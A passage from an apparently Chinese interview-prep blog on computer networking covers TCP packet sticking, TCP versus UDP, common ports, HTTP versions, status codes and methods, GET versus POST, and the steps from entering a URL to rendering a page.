设置为慢开始门限，并且采用拥塞避免算法（连续收到了三个重复请求，说明当前网络可能没有拥塞）。</li><li>采用快恢复算法时，慢开始只在建立连接和网络超时才使用。</li></ul><h3 id="11-什么是粘包？TCP粘包是怎么产生的？"><a href="#11-什么是粘包？TCP粘包是怎么产生的？" class="headerlink" title="11 - 什么是粘包？TCP粘包是怎么产生的？"></a>11 - 什么是粘包？TCP粘包是怎么产生的？</h3><h4 id="什么是粘包？"><a href="#什么是粘包？" class="headerlink" title="什么是粘包？"></a>什么是粘包？</h4><p>如果客户端连续不断的向服务端发送数据包时，服务端接受的数据会出现两个数据报粘在一起的情况。</p><p><strong>接收端收到了两个数据包，但是这两个数据包要么是不完整的，要么就是多出一块，这种情况即发生了拆包和粘包，</strong>拆包和粘包的问题导致接收端在处理的时候会非常困难，因为无法区分一个完整的数据包。</p><ul><li>TCP是基于字节流的，虽然应用层和TCP传输层之间的数据交互是大小不等的数据块，但是TCP把这些数据块仅仅看成一连串无结构的字节流，没有边界。</li><li>从TCP的帧结构上也可以看出，在TCP的首部没有表示数据长度的字段</li></ul><p>基于以上两点，在使用TCP传输数据时，才有粘包或拆包现象发生的可能。一个数据包中包含了发送端发送的两个数据包的信息，这种现象即为粘包</p><h3 id="12-TCP粘包是怎么产生的？"><a href="#12-TCP粘包是怎么产生的？" class="headerlink" title="12 - TCP粘包是怎么产生的？"></a>12 - TCP粘包是怎么产生的？</h3><ul><li><p>发送方产生粘包</p><ul><li>采用TCP协议传输数据的客户端与服务器经常是保持一个长连接的状态（一次连接发一次数据不存在粘包），双方在连接不断开的情况下，可以一直传输数据。但当发送的数据包过于小的时候，TCP协议默认会启用Nagle算法，将这些较小的数据包进行合并发送；这个合并过程就是在发送缓冲区中进行的，也就是说数据发送出来的时候它就已经是粘包的状态了。</li></ul></li><li><p>接收方产生粘包</p><ul><li>接收方采用TCP协议接收数据时的过程是这样的：数据到接收方，从网络模型的下方传递至传输层，传输层的TCP协议处理是将其放置接收缓冲区，然后由应用层来主动获取（C采用recv、read等函数）；这时会出现一个问题，就是我们在程序中调用的读取数据函数不能及时的把缓冲区的数据拿出来，而下一个数据又到来并有一部分放入的缓冲区末尾，等我们读取数据时就是一个粘包。（放数据的速度 &gt; 应用层拿数据速度）</li></ul></li></ul><h3 id="13-怎么解决拆包和粘包？"><a href="#13-怎么解决拆包和粘包？" class="headerlink" title="13 - 怎么解决拆包和粘包？"></a>13 - 怎么解决拆包和粘包？</h3><p>分包机制一般有两个通用的解决方法：</p><ul><li>特殊字符控制</li><li>在包头首部添加数据包的长度</li></ul><p>如果使用netty框架的话，就有专门的编码器和解码器解决拆包和粘包的问题了</p><h4 id="UDP没有粘包问题！"><a href="#UDP没有粘包问题！" class="headerlink" title="UDP没有粘包问题！"></a>UDP没有粘包问题！</h4><p>UDP没有粘包问题，但是有丢包和乱序问题。不完整的包是不会有的，收到的都是完全正确的包。传送的数据单位协议是UDP报文或用户数据报，发送的时候既不合并，也不拆分。</p><h3 id="14-说一说TCP与UDP的特点？"><a href="#14-说一说TCP与UDP的特点？" class="headerlink" title="14 - 说一说TCP与UDP的特点？"></a>14 - 说一说TCP与UDP的特点？</h3><h4 id="TCP协议的主要特点："><a href="#TCP协议的主要特点：" class="headerlink" title="TCP协议的主要特点："></a>TCP协议的主要特点：</h4><ol><li><strong>TCP是面向连接的运输层协议；</strong>面向连接就是双方在传输数据之前，必须建立一条通道，例如三次握手就是建立通道的一个过程，四次挥手则是结束销毁通道的一个过程</li><li><strong>每一条TCP连接只能有两个端点，是点对点的</strong></li><li><strong>TCP提供可靠的传输服务，传送的数据无差错、不丢失、不重复、按序到达</strong></li><li>TCP提供全双工的通信。允许通信双方的应用进程在任何时候都可以发送数据，因为两端都设有发送缓存和接收缓存</li><li><strong>面向字节流。</strong>虽然应用程序与TCP交互是一次一个大小不等的数据库，但TCP把这些数据看成一连串无结构的字节流，它不保证接收方收到的数据块和发送方发送的数据块具有对应大小关系，例如发送方应用程序交给发送方的TCP10个数据块，但接收方的TCP可能只用了4个数据块就保证收到的字节流交付给上层的应用，但字节流完全一样。</li></ol><h4 id="UDP协议的主要特点："><a href="#UDP协议的主要特点：" class="headerlink" title="UDP协议的主要特点："></a>UDP协议的主要特点：</h4><ol><li>UDP是无连接的传输层协议</li><li>UDP支持一对一、一对多、多对多的交互通信</li><li>UDP是尽最大努力交付，但不保证可靠交付，不能保证数据的有序性</li><li>UDP是面向报文的，对应用层交下来的报文，不合并，不拆分，<strong>只保留原报文的边界</strong></li><li>UDP没有拥塞控制，即时网络出现拥塞也不会降低发送速率</li><li>UDP的首部开销小，只有8个字节</li></ol><h3 id="15-说一说TCP与UDP的区别？："><a href="#15-说一说TCP与UDP的区别？：" class="headerlink" title="15 - 说一说TCP与UDP的区别？："></a>15 - 说一说TCP与UDP的区别？：</h3><p>（1）连接：</p><ul><li>TCP 是面向连接的传输层协议，即传输数据之前必须先建立好连接。</li><li>UDP是无连接的。</li></ul><p>（2）服务对象：</p><ul><li>TCP 是点对点的两点间服务，即一条 TCP 连接只能有两个端点;</li><li>UDP 支持一对一，一对多，多对一，多对多的交互通信。</li></ul><p>（3）可靠性：</p><ul><li>TCP 是可靠交付:无差错，不丢失，不重复，按序到达。 </li><li>UDP 是尽最大努力交付，不保证可靠交付。</li></ul><p>（4）拥塞控制，流量控制：</p><ul><li><p>TCP 有拥塞控制和流量控制保证数据传输的安全性。</p></li><li><p>UDP 没有拥塞控制，网络拥塞不会影响源主机的发送效率。</p></li></ul><p>（5) 报文长度：</p><ul><li>TCP 是动态报文长度，即 TCP 报文长度是根据接收方的窗口大小和当前网络拥塞情况决定的。 </li><li>UDP 面向报文，不合并，不拆分，保留上面传下来报文的边界。</li></ul><p>（6）首部开销：</p><ul><li>TCP 首部开销大，首部 20 个字节。</li><li>UDP 首部开销小，8 字节。(源端口，目的端口，数据长度，校验和)</li></ul><p>（7）TCP传输速度比UDP慢，TCP是重量级协议、UDP是轻量级协议</p><h3 id="16-TCP和UDP适用场景有哪些？"><a href="#16-TCP和UDP适用场景有哪些？" class="headerlink" title="16 - TCP和UDP适用场景有哪些？"></a>16 - TCP和UDP适用场景有哪些？</h3><p>TCP 是可靠的但传输速度慢，UDP 是不可靠的但传输速度快。因此 在选用具体协议通信时，应该根据通信数据的要求而决定。</p><p>文件传输、重要状态的 更新等适合使用TCP </p><p>视频传输、实时通信等使用UDP效果更好</p><h3 id="17-基于TCP和UDP的常用协议有哪些？"><a href="#17-基于TCP和UDP的常用协议有哪些？" class="headerlink" title="17 - 基于TCP和UDP的常用协议有哪些？"></a>17 - 基于TCP和UDP的常用协议有哪些？</h3><ul><li><p>TCP对应的应用层协议：</p><ul><li><strong>HTTP ：80端口 、HTTPS：443端口</strong></li><li><strong>FTP：21端口，</strong>文件传输协议</li><li><strong>TELNET：23端口，</strong>远程终端协议，是一种用于远程登录的端口，用户可以以自己的身份远程连接到计算机上，通过这种端口可以提供一种基于DOS模式下的通信服务。</li><li><strong>SMTP：25端口，</strong>简单邮件传输协议，用于发送邮件</li><li><strong>POP3：110端口，</strong>用于接收邮件</li></ul></li><li><p>UDP对应的应用层协议：</p><ul><li><strong>TFTP：69端口，</strong>简单文件传输协议</li><li><strong>DNS：53端口，</strong>用于域名解析服务，将域名地址转换为IP地址</li><li><strong>SNMP：161端口</strong>：简单网络管理协议，用来管理网络设备</li><li>DHCP：动态主机配置协议，DHCP服务器使用UDP端口67，DHCP客户端从UDP端口68发送DHCP发现报文</li></ul><p>UDP的其他协议：RIP（路由信息协议），位于网络层</p></li></ul><h3 id="18-网络层如何知道报文应该给哪个应用程序，又如何区分UDP报文和TCP报文？"><a href="#18-网络层如何知道报文应该给哪个应用程序，又如何区分UDP报文和TCP报文？" class="headerlink" title="18 - 网络层如何知道报文应该给哪个应用程序，又如何区分UDP报文和TCP报文？"></a>18 - 网络层如何知道报文应该给哪个应用程序，又如何区分UDP报文和TCP报文？</h3><p><strong>根据端口分区</strong></p><p><strong>看报文头部的协议标识字段，17是UDP，6是TCP</strong></p><h3 id="19-说一说-HTTP1-0、HTTP1-1、HTTP2-0的区别？"><a href="#19-说一说-HTTP1-0、HTTP1-1、HTTP2-0的区别？" class="headerlink" title="19 - 说一说 HTTP1.0、HTTP1.1、HTTP2.0的区别？"></a>19 - 说一说 HTTP1.0、HTTP1.1、HTTP2.0的区别？</h3><h4 id="HTTP1-0"><a href="#HTTP1-0" class="headerlink" title="HTTP1.0"></a>HTTP1.0</h4><ul><li><strong>HTTP1.0规定浏览器与服务器只保持短暂的连接，</strong>浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接。就像打电话一样，一次只能说一件事，说完就要挂断，又因为TCP连接建立一次需要三次握手，所以效率很低。</li></ul><p><strong>如果不想断开连接，需要在HTTP相应的Connection字段指定为keep-live</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection:keep-alive;</span><br></pre></td></tr></table></figure><h4 id="HTTP1-1"><a href="#HTTP1-1" class="headerlink" title="HTTP1.1"></a>HTTP1.1</h4><ul><li><p><strong>HTTP1.1引进了持久连接，TCP连接默认不关闭，可以被多个请求复用。</strong>客户端和服务端发现对方一段时间没有活动后，可以主动关闭连接；或者客户端在最后一个请求时，主动告诉服务端要关闭连接。</p></li><li><p>HTTP1.0就像打一次电话只能说一次事，HTTP1.1是打完电话先不直接挂断，而是持续一会，这期间如果有事情还可以再次沟通。</p></li><li><p>HTTP1.1还引入了管道机制，即在同一个TCP连接里，客户端可以同时发送多个请求，这样就进一步改进了HTTP协议的效率。</p></li></ul><h4 id="HTTP2-0"><a href="#HTTP2-0" class="headerlink" title="HTTP2.0"></a>HTTP2.0</h4><ul><li><p><strong>HTTP2.0采用了多路复用，即在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按顺序一一对应</strong>。能这样做有一个前提，就是HTTP2.0进行了二进制分帧，即会将所有传输的信息分割为更小的消息和帧，并对它们采用二进制格式的编码。</p></li><li><p>负责这个拆分、组装请求和二进制帧的一层就叫做<strong>二进制分帧层</strong></p></li><li><p>也就是说，老板可以同时下达多个命令，员工也可以收到请求A和请求B，于是先回应A，结果发现处理A非常耗时，于是就发送A请求已经处理好的部分，接着回应B请求，完成后 ，再发送A请求剩下的部分。A请求的两部分响应再组合到一起发送给老板</p></li><li><p>除此之外还有一些其他的优化，比如<strong>Header压缩</strong>、<strong>服务端推送</strong>等</p><ul><li>Header压缩就是压缩老板和员工之间的对话</li><li>服务端推送就是员工事先把一些老板可能询问的事情提前发送到老板的手机上（缓存）。这样老板想要知道的时候就可以直接读取短信（缓存）了。</li></ul></li></ul><h4 id="HTTP发展历程："><a href="#HTTP发展历程：" class="headerlink" title="HTTP发展历程："></a>HTTP发展历程：</h4><ol><li>HTTP 协议始于三十年前蒂姆·伯纳斯 - 李的一篇论文；</li><li>HTTP&#x2F;0.9 是个简单的文本协议，只能获取文本资源；</li><li>HTTP&#x2F;1.0 确立了大部分现在使用的技术，但它不是正式标准；</li><li>HTTP&#x2F;1.1 是目前互联网上使用最广泛的协议，功能也非常完善；</li><li>HTTP&#x2F;2 基于 Google 的 SPDY 协议，注重性能改善，但还未普及；</li><li>HTTP&#x2F;3 基于 Google 的 QUIC 协议，是将来的发展方向。</li></ol><h3 id="20-HTTP协议有哪些特点？"><a href="#20-HTTP协议有哪些特点？" class="headerlink" title="20 - HTTP协议有哪些特点？"></a>20 - HTTP协议有哪些特点？</h3><h4 id="HTTP是什么？"><a href="#HTTP是什么？" class="headerlink" title="HTTP是什么？"></a>HTTP是什么？</h4><ol><li>**HTTP 是一个用在计算机世界里的协议，它确立了一种计算机之间交流通信的规范，以<br>及相关的各种控制和错误处理方式。 **（定义）</li><li>HTTP 专门用来在两点之间传输数据，不能用于广播、寻址或路由。</li><li>HTTP 传输的是文字、图片、音频、视频等超文本数据。</li><li>HTTP 是构建互联网的重要基础技术，它没有实体，依赖许多其他的技术来实现，但同<br>时许多技术也都依赖于它。</li></ol><h4 id="HTTP协议概念："><a href="#HTTP协议概念：" class="headerlink" title="HTTP协议概念："></a>HTTP协议概念：</h4><ul><li>HTTP 协议是 Hyper Text Transfer Protocol(超文本传输协议)的缩写，是用于从万维网(WWW:World Wide Web)服务器传输超文本到本地浏览器的传送协议。</li><li>HTTP 是一个基于 TCP&#x2F;IP 通信协议来传递数据(HTML 文件，图片文件，查询结果等)。</li><li>HTTP 是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒 体信息系统。</li><li>HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端（即 WEB 服务器）发送所有请求。Web 服务器根据接收到的请求后，向客户端发送响应信息。</li></ul><h4 id="HTTP协议特点："><a href="#HTTP协议特点：" class="headerlink" title="HTTP协议特点："></a>HTTP协议特点：</h4><ol><li>简单快速：</li></ol><ul><li>客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有 GET、HEAD、POST。 每种方法规定了客户与服务器联系的类型不同。由于 HTTP 协议简单，使得 HTTP 服务器的程序规模小，因而通信速度很快。</li></ul><ol start="2"><li>灵活：</li></ol><ul><li>HTTP 允许传输任意类型的数据对象。正在传输的类型由 Content-Type 加以标记</li></ul><ol start="3"><li>无连接：</li></ol><ul><li>无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应 答后，即断开连接。采用这种方式可以节省传输时间。</li></ul><ol start="4"><li>无状态：</li></ol><ul><li>HTTP 协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如 果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方 面，在服务器不需要先前信息时它的应答就较快。</li></ul><ol start="5"><li>支持 B&#x2F;S 及 C&#x2F;S 模式</li><li>默认端口为80</li><li>基于TCP协议</li></ol><h3 id="21-HTTP返回码"><a href="#21-HTTP返回码" class="headerlink" title="21 - HTTP返回码"></a>21 - HTTP返回码</h3><p>HTTP 协议的响应报文由状态行、响应头部和响应包体组成，其响应状态码总体描述如下：</p><ul><li>1xx：<strong>指示信息</strong>–表示请求已接收，继续处理。</li><li>2xx：<strong>成功</strong>–表示请求已被成功接收、理解、接受。</li><li>3xx：<strong>重定向</strong>–要完成请求必须进行更进一步的操作。</li><li>4xx：<strong>客户端错误</strong>–请求有语法错误或请求无法实现。</li><li>5xx：<strong>服务器端错误</strong>–服务器未能实现合法的请求。</li></ul><p>常见状态代码、状态描述的详细说明如下：</p><ul><li><strong>200 OK：客户端请求成功。</strong></li><li>206 partial content 服务器已经正确处理部分GET 请求，实现断点续传或同时分片下载，该请求必须包含Range 请求头来指示客户端期望得到的范围</li><li>300 multiple choices（可选重定向）:被请求的资源有一系列可供选择的反馈信息，由浏览器&#x2F;用户自行选择其中一个。</li><li><strong>301 moved permanently（永久重定向）：该资源已被永久移动到新位置，将来任何对该资源的访问都要使用本响应返回的若干个URI 之一。</strong></li><li><strong>302 move temporarily(临时重定向)：指页面暂时性转移，表示资源或页面暂时转移到另一个位置，常被用作网络劫持，容易导致网站降权，严重时网站会被封掉，不推荐使用</strong></li><li>304：not modified :如果客户端发送一个待条件的GET 请求并且该请求以经被允许，而文档内容未被改变，则返回304,该响应不包含包体（即可直接使用缓存）。</li><li><strong>403 Forbidden：服务器收到请求，但是拒绝提供服务。</strong></li><li><strong>404  ：服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置 您所请求的资源无法找到” 的个性页面</strong></li></ul><h3 id="22-HTTP如何实现长连接？在什么时候会超时？"><a href="#22-HTTP如何实现长连接？在什么时候会超时？" class="headerlink" title="22 - HTTP如何实现长连接？在什么时候会超时？"></a>22 - HTTP如何实现长连接？在什么时候会超时？</h3><p><strong>通常在头部（请求和响应头）设置Connection: keep-alive，HTTP1.0协议支持，但默认是关闭，从HTTP1.1协议开始，连接默认都是长连接</strong></p><p><strong>长连接什么时候会超时？</strong></p><ul><li>HTTP一般会有httpd守护进程，里面可以设置 keep-alive timeout，当TCP连接闲置时间超过这个时间就会关闭，可以在HTTP的header里面设置超时时间</li><li>TCP的 keep-alive 包含三个参数，支持在系统内核的 net.ipv4 里面设置：当TCP连接之后，设置了tcp_keepalive_time时间，则会发送侦测包，如果没有收到对方的ACK，那么每隔tcp_keepalive_intvl再发一次，直到发送了tcp_keepalive_probes，就会丢弃该链接<ul><li>tcp_keepalive_time &#x3D; 1800</li><li>tcp_keepalive_intvl &#x3D; 15</li><li>tcp_keepalive_probes &#x3D; 5</li></ul></li><li><strong>实际上HTTP没有长短连接，只有TCP有，TCP长连接可以复用一个TCP连接来发起多次HTTP请求，这样就可以减少资源消耗，比如一次请求HTML，可能还需要请求后续的 JS&#x2F;CSS&#x2F;图片等。</strong>（重要！！！）</li></ul><h3 id="23-HTTP方法有哪些？"><a href="#23-HTTP方法有哪些？" class="headerlink" title="23 - HTTP方法有哪些？"></a>23 - HTTP方法有哪些？</h3><p>客户端发送的请求报文第一行为行为请求，包含了方法字段：</p><ol><li><strong>GET：获取资源，当前网络绝大部分使用的都是GET</strong></li><li><strong>POST：传输实体主体</strong></li><li><strong>HEAD：获取报文首部，和GET方法类似，但是不返回报文实体主体部分</strong></li><li><strong>PUT：上传文件，由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法</strong></li><li>PATCH：对资源进行部分修改。PUT也可以用于修改资源，但是只能完全替代原始资源，PATCH允许部分修改</li><li>OPTIONS：查询指定的URL支持的方法</li><li>CONNECT：要求在与代理服务器通信时建立隧道，使用SSL（Secure Sockets Layer，安全套接层）和TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</li><li>TRACE：追踪路径，服务器会将通信返回给客户端。发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器就减1，当数值为0时就停止传输。通常不会使用TRACE，因为其易受到XST攻击（Cross-Site Tracing，跨站追踪）。</li></ol><h3 id="24-forward-和-redirect-的区别？"><a href="#24-forward-和-redirect-的区别？" class="headerlink" title="24 - forward 和 redirect 的区别？"></a>24 - forward 和 redirect 的区别？</h3><p>Forward 和 Redirect 代表了两种请求转发方式：直接转发和间接转发。</p><ul><li>直接转发方式（Forward）：客户端和浏览器只发出一次请求，Servlet、HTML、JSP或其他信息资源，由第二个信息资源响应该请求，在请求对象request中，保存的对象对于每个信息资源是共享的。</li><li>间接转发方式（Redirect）：实际是两次HTTP请求，服务端在响应第一次请求的时候，让浏览器再向另外一个URL发出请求，从而达到转发的目的</li></ul><h3 id="25-GET-和-POST-的区别"><a href="#25-GET-和-POST-的区别" class="headerlink" title="25 - GET 和 POST 的区别"></a>25 - GET 和 POST 的区别</h3><h4 id="概括："><a href="#概括：" class="headerlink" title="概括："></a>概括：</h4><ul><li><p><strong>对于GET 方式的请求，浏览器会把http header 和data 一并发送出去，服务器响应200（返回数据）</strong></p></li><li><p><strong>而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）</strong></p></li></ul><h4 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h4><ul><li>（1）get 参数通过 url 传递，post 放在 request body 中。</li><li>（2）get 请求在 url 中传递的参数是有长度限制的，而 post 没有。</li><li>（3）get 比 post 更不安全，因为参数直接暴露在 url 中，所以不能用来传递敏感信息。</li><li>（4）get 请求只能进行 url 编码，而 post 支持多种编码方式。</li><li>（5）get 请求会浏览器主动 cache，而 post 支持多种编码方式。</li><li>（6）get 请求参数会被完整保留在浏览历史记录里，而post 中的参数不会被保留。</li><li>（7）GET 和POST 本质上就是TCP 连接，并无差别。但是由于HTTP 的规定和浏览器&#x2F;服务器的限制，导致他们在应用过程中体现出一些不同。</li><li>（8）GET 产生一个TCP 数据包；POST 产生两个TCP 数据包。</li></ul><h3 id="26-GET请求中URL编码的意义？"><a href="#26-GET请求中URL编码的意义？" class="headerlink" title="26 - GET请求中URL编码的意义？"></a>26 - GET请求中URL编码的意义？</h3><p><strong>在GET请求中会对URL中非西方文字进行编码，这样做是为了避免歧义</strong></p><p>对一些特殊字符如&amp;，解析时会产生歧义，比如将 <code>name1=va&amp;lu=e1</code>编码成 <code>name1=va%26lu%3D</code>，这样服务端就会把%后的字节当成普通的字节，不会把它当成各个参数或键值对的分隔符。</p><h3 id="27-HTTP的过程是什么？"><a href="#27-HTTP的过程是什么？" class="headerlink" title="27 - HTTP的过程是什么？"></a>27 - HTTP的过程是什么？</h3><p>HTTP 协议定义 Web 客户端如何从 Web 服务器请求 Web 页面，以及服务器如何把 Web 页面传 送给客户端。HTTP 协议采用了请求&#x2F;响应模型。客户端向服务器发送一个请求报文，请求报文包 含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的 内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p><p><strong>（1）客户端连接到Web服务器：</strong></p><p>一个HTTP 客户端，通常是浏览器，与Web 服务器的HTTP 端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.baidu.com./">http://www.baidu.com。</a></p><p><strong>（2）发送HTTP请求：</strong></p><p>通过TCP 套接字，客户端向Web 服务器发送一个文本的请求报文，一个请求报文由4 部分组成：</p><ul><li>请求行</li><li>请求头部</li><li>空行</li><li>请求数据</li></ul><p><strong>（3）服务器接受请求并返回HTTP响应：</strong></p><p>Web 服务器解析请求，定位请求资源。服务器将资源复本写到TCP 套接字，由客户端读取。一个响应由4 部分组成：</p><ul><li>状态行</li><li>响应头部</li><li>空行</li><li>响应数据</li></ul><p><strong>（4）释放连接TCP 连接：</strong></p><ul><li>若connection 模式为close，则服务器主动关闭TCP 连接，客户端被动关闭连接，释放TCP连接;</li><li>若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</li></ul><p><strong>（5）客户端浏览器解析HTML 内容：</strong></p><ul><li>客户端浏览器首先解析<strong>状态行</strong>，查看表明请求是否成功的状态代码。</li><li>然后解析每一个<strong>响应头</strong>，响应头告知以下为若干字节的HTML 文档和文档的字符集。</li><li>客户端浏览器<strong>读取响应数据HTML</strong>，根据HTML 的语法对其进行格式化，并在浏览器窗口中显示。</li></ul><h3 id="28-在浏览器输入URL地址到显示主页的过程？"><a href="#28-在浏览器输入URL地址到显示主页的过程？" class="headerlink" title="28 - 在浏览器输入URL地址到显示主页的过程？"></a>28 - 在浏览器输入URL地址到显示主页的过程？</h3><p><strong>大概过程：</strong></p><p>（1）浏览器向DNS 服务器请求解析该URL 中的域名所对应的IP 地址；<br>（2）解析出IP 地址后，根据该IP 地址和默认端口80，和服务器建立TCP 连接；<br>（3）浏览器发出读取文件（URL 中域名后面部分对应的文件）的HTTP 请求，该请求报文作为TCP 三次握手的第三个报文的数据发送给服务器；<br>（4）服务器对浏览器请求作出响应，并把对应的html 文本发送给浏览器；<br>（5）释放TCP 连接；<br>（6）浏览器将该html 文本解析后显示网页内容；</p><p><strong>细致过程（笔试原题，排序）：</strong></p><p>1、浏览器输入URL，先解析URL地址是否合法</p><p>2、浏览器检查是否有缓存（浏览器缓存 - 系统缓存 - 路由器缓存）。如果有，直接显示。没有，进行（3）</p><p>3、在发送HTTP请求前，需要域名解析（DNS解析），解析获取对应的IP地址</p><p>4、浏览器向服务器发起TCP连接，进行TCP连接的三次握手</p><p>5、握手成功后，浏览器向服务器发送HTTP请求，请求数据包</p><p>6、服务器收到请求，进行处理后将数据发送给浏览器（请求报文作为TCP 三次握手的第三个报文的数据发送给服务器）</p><p>7、浏览器收到HTTP响应</p><p>8、浏览器解析响应，如果响应可以缓存则存入缓存</p><p>9、浏览器发送请求获取嵌入在HTML的资源（HTML、CSS、JS等），对于未知类型，会弹出对话框</p><p>10、浏览器发送异步请求</p><p>11、页面全部渲染结束显示网页</p><h3 id="29-搜索-www-baidu-com，会用到计算机网络中的那些层？每层的作用？"><a href="#29-搜索-www-baidu-com，会用到计算机网络中的那些层？每层的作用？" class="headerlink" title="29 - 搜索 www.baidu.com，会用到计算机网络中的那些层？每层的作用？"></a>29 - 搜索 <a href="http://www.baidu.com，会用到计算机网络中的那些层？每层的作用？">www.baidu.com，会用到计算机网络中的那些层？每层的作用？</a></h3><h4 id="全过程："><a href="#全过程：" class="headerlink" title="全过程："></a>全过程：</h4><p>1、<strong>域名解析：</strong>浏览器获得URL地址，向操作系统请求该URL对应的IP地址，操作系统查询DNS（首先查询本地HOST文件，没有则查询网络）获得对应的IP地址</p><p>2、确认IP和端口号（不注明端口号则默认为80端口）后，则可以向该IP地址对应的服务器的该端口号发起TCP连接请求</p><p>3、服务器接收到TCP连接请求后，回复可以连接请求</p><p>4、浏览器收到回传的数据后，还会向服务器发送数据包，表示三次握手结束</p><p>5、三次握手成功后，开始通讯，根据HTTP协议的要求，组织一个请求的数据包，里面包含请求的资源路径、你的身份信息等，例如，<a href="http://www.abc.com/images/1/%E8%A1%A8%E7%A4%BA%E7%9A%84%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84%E6%98%AFimages/1/%EF%BC%8C%E5%8F%91%E9%80%81%E5%90%8E%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%93%8D%E5%BA%94%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%B0%86%E6%95%B0%E6%8D%AE%E8%BF%94%E5%9B%9E%E7%BB%99%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%8C%E6%95%B0%E6%8D%AE%E5%8F%AF%E4%BB%A5%E6%98%AF%E6%A0%B9%E6%8D%AEHTML%E5%8D%8F%E8%AE%AE%E7%BB%84%E7%BB%87%E7%9A%84%E7%BD%91%E9%A1%B5%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%8C%85%E5%90%AB%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%B8%83%E5%B1%80%E3%80%81%E6%96%87%E5%AD%97%E7%AD%89%E7%AD%89%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E6%98%AF%E5%9B%BE%E7%89%87%E6%88%96%E8%80%85%E8%84%9A%E6%9C%AC%E7%A8%8B%E5%BA%8F%E7%AD%89%EF%BC%8C%E5%A6%82%E6%9E%9C%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84%E6%8C%87%E5%AE%9A%E7%9A%84%E8%B5%84%E6%BA%90%E4%B8%8D%E5%AD%98%E5%9C%A8%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B0%B1%E4%BC%9A%E8%BF%94%E5%9B%9E404%E9%94%99%E8%AF%AF%EF%BC%8C%E5%A6%82%E6%9E%9C%E8%BF%94%E5%9B%9E%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%88%99%E6%A0%B9%E6%8D%AE%E9%A1%B5%E9%9D%A2%E9%87%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A4%96%E9%93%BEURL%E5%9C%B0%E5%9D%80%EF%BC%8C%E9%87%8D%E5%A4%8D%E4%B8%8A%E8%BF%B0%E6%AD%A5%E9%AA%A4%EF%BC%8C%E5%86%8D%E6%AC%A1%E8%8E%B7%E5%8F%96">www.abc.com/images/1/表示的资源路径是images/1/，发送后，服务器响应请求，将数据返回给浏览器，数据可以是根据HTML协议组织的网页，里面包含页面的布局、文字等等，也可以是图片或者脚本程序等，如果资源路径指定的资源不存在，服务器就会返回404错误，如果返回的是一个页面，则根据页面里的一些外链URL地址，重复上述步骤，再次获取</a></p><p>6、渲染页面，并开始响应用户的操作</p><p>7、窗口关闭时，浏览器终止与服务器的连接</p><h4 id="用到的层和协议："><a href="#用到的层和协议：" class="headerlink" title="用到的层和协议："></a>用到的层和协议：</h4><ol><li><p>浏览器中输入URL</p></li><li><p><strong>浏览器要将URL 解析为IP 地址，解析域名就要用到DNS 协议</strong>，首先主机会查询DNS 的缓存，如果没有就给本地DNS 发送查询请求。DNS 查询分为两种方式，一种是递归查询，一种是迭代查询。如果是迭代查询，本地的DNS 服务器，向根域名服务器发送查询请求，根域名服务器告知该域名的一级域名服务器，然后本地服务器给该一级域名服务器发送查询请求，然后依次类推直到查询到该域名的IP 地址。<strong>DNS 服务器是基于UDP的，因此还会用到UDP 协议。</strong></p></li><li><p><strong>得到 IP 地址后，浏览器就要与服务器建立一个HTTP 连接，因此要用到 HTTP 协议，</strong>HTTP 协议报文格式上面已经提到。<strong>HTTP 生成一个get 请求报文，将该报文传给传输层处理，所以还会用到TCP 协议。</strong>如果采用HTTPS 还会使用HTTPS 协议先对HTTP数据进行加密。传输层如果有需要先将HTTP 数据包分片，分片依据路径MTU 和MSS。<strong>TCP 的数据包然后会发送给网络层，用到IP协议。</strong>网络层通过路由选路，一跳一跳发送到目的地址。当然<strong>在一个网段内的寻址是通过以太网协议实现(也可以是其他物理层协议，比如PPP，SLIP)<strong>，</strong>以太网协议需要知道目的IP 地址的物理地址，需要ARP 协议。</strong></p></li></ol><h4 id="每层的作用："><a href="#每层的作用：" class="headerlink" title="每层的作用："></a>每层的作用：</h4><p><strong>1 - 应用层：DNS 、HTTP 、HTTPS ：</strong></p><p><strong>应用层是体系结构中的最高层。应用层确定进程之间通信的性质以满足用户的需要。</strong>这里的进程就是指正在运行的程序。应用层不仅要提供应用进程所需要的信息交换和远地操作，而且还要作为互相作用的应用进程的用户代理，来完成一些为进行语义上有意义的信息交换所必须的功能。应用层直接为用户的应用进程提供服务</p><p><strong>2 - 